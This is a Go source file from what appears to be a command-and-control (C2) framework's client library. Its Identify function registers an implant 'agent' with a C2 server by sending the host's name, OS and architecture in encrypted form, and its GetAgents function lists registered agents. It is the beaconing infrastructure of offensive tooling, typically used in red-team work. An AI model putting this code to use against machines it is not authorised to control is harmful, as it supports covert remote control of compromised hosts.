package c2api

import (
	"bytes"
	"crypto/rsa"
	"encoding/json"
	"io"
	"net/http"

	cry "github.com/zarkones/xena-crypto"
)

// Identify should be called prior to interacting with the system.
// It allows an agent to make itself known to the C2 server.
func Identify(hostname, os, arch, pubKeyPEM string, decryptionKey *rsa.PrivateKey) (id string, err error) {
	if TrustedPubKey == nil {
		return "", ErrKeyIsNil
	}
	payload := Agent{
		Hostname:  hostname,
		PubKeyPEM: pubKeyPEM,
		OS:        os,
		Arch:      arch,
	}

	jsonPayload, err := json.Marshal(&payload)
	if err != nil {
		return "", err
	}

	encrypted, err := cry.SecureWrap(TrustedPubKey, string(jsonPayload))
	if err != nil {
		return "", err
	}

	req, err := http.NewRequest(http.MethodPost, *BaseURL+"/v1/agents", bytes.NewBuffer([]byte(encrypted)))
	if err != nil {
		return "", err
	}

	resp, err := c.Do(req)
	if err != nil {
		return "", err
	}

	encryptedResp, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	decryptedResp, err := cry.SecureUnwrap(decryptionKey, string(encryptedResp))
	if err != nil {
		return "", err
	}

	var respCtx struct {
		ID string `json:"id"`
	}

	if err := json.Unmarshal([]byte(decryptedResp), &respCtx); err != nil {
		return "", err
	}

	return respCtx.ID, nil
}

// GetAgents asks the C2 for the list of agents.
func GetAgents() (agents []Agent, err error) {
	req, err := http.NewRequest(http.MethodGet, *BaseURL+"/v1/agents", nil)
	if err != nil {
		return nil, err
	}

	setAuth(req)

	resp, err := c.Do(req)
	if err != nil {
		return nil, err
	}

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	if err := json.Unmarshal(respBody, &agents); err != nil {
		return nil, err
	}

	return agents, nil
}
